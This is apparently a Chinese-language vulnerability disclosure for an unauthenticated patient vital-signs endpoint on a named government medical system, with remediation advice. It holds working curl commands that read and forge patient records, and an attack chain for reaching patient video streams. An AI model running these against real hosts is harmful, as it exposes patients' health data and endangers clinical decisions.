## Description

EPCR 医疗 PCDT (运动负荷试验) 系统的 vitalSignVideoServer (端口 4001) 的 /events 端点未实施认证机制，允许未认证用户读取 (GET) 和写入 (POST) 生命征象事件数据。GET 返回 567201 条患者 PCDT 事件记录，POST 可创建新事件 (201 Created)。

## Reproduction

**复现未授权读取:**
1. 打开终端
2. 执行命令: `curl -sk "https://epcr.tpf.gov.tw:4001/events"`
3. 观察响应状态码: 200 OK
4. 查看响应头: `Content-Range: items 0-99/567201`
5. 解析 JSON 响应，查看事件数据 (CaseID, 血压, 时间戳等)
6. (可选) 测试分页: `curl -sk -H "content-range: items 567100-567199/567201" "https://epcr.tpf.gov.tw:4001/events"`

**复现未授权写入:**
1. 执行命令:
```bash
curl -sk -X POST "https://epcr.tpf.gov.tw:4001/events" \
  -H "Content-Type: application/json" \
  -d '{
    "CaseID": "TEST_REPRODUCE_001",
    "recordUuid": "REPRODUCE_UUID",
    "TypeOfEventTxt": "BP",
    "TypeOfEventNum": "110",
    "Caption": "Reproduction Test",
    "Value": "120/80",
    "Unit": "1",
    "Systolic": "120",
    "Diastolic": "80",
    "Mean": "100",
    "Timestamp": "2024-01-01T00:00:00.000Z",
    "Elapsed": 0
  }'
```
2. 观察响应状态码: 201 Created
3. 查看 location header: `/events/5672XX`
4. 验证写入: `curl -sk "https://epcr.tpf.gov.tw:4001/events?CaseID=TEST_REPRODUCE_001"`

## Impact

**数据泄露 (High):**
1. **患者隐私泄露**: 567201 条 PCDT (运动负荷试验) 生命征象事件记录，包含:
   - 患者 CaseID (可关联到具体患者)
   - recordUuid (记录唯一标识)
   - 时间戳 (精确到毫秒)
   - 血压数据 (Systolic/Diastolic/Mean)
   - 事件类型 (BP, HR, ST 等)
2. **医疗数据完整性**: 攻击者可写入伪造事件 (201 Created)，影响临床决策
3. **数据量**: 56 万+ 条记录，覆盖 59 个测试案例，时间跨度 1 个月

**业务影响:**
- PCDT 是心血管疾病诊断的重要检查，数据泄露可暴露患者心脏健康状况
- 伪造数据可能导致错误诊断或治疗决策
- 攻击者可枚举 recordUuid 访问实时视频流 (mer2voip.tpf.gov.tw:30080)

**攻击链:**
1. 读取 /events 获取 recordUuid 和 CaseID
2. 构造实时视频 URL: `https://mer2voip.tpf.gov.tw:30080/live?app=rtmp&stream=live${recordUuid}`
3. 访问患者 PCDT 实时/回放视频

## Recommendation

**短期修复:**
1. **添加 JWT 认证**: 在 /events 路由添加认证中间件，要求有效的 Bearer Token
2. **速率限制**: 添加速率限制防止数据爬取 (如: 100 req/min)
3. **分页限制**: 限制单次查询返回数量 (如: max 1000 条)
4. **CORS 策略**: 配置严格的 CORS，限制可访问的源

**长期修复:**
1. **API 网关**: 部署 API 网关统一处理认证、授权、限流
2. **数据脱敏**: 对敏感字段 (CaseID, recordUuid) 进行脱敏处理
3. **审计日志**: 记录所有 /events 访问，便于追踪未授权访问
4. **RBAC**: 实现基于角色的访问控制，区分只读和读写权限
5. **数据库视图**: 使用数据库视图限制可访问的字段

**验证方法:**
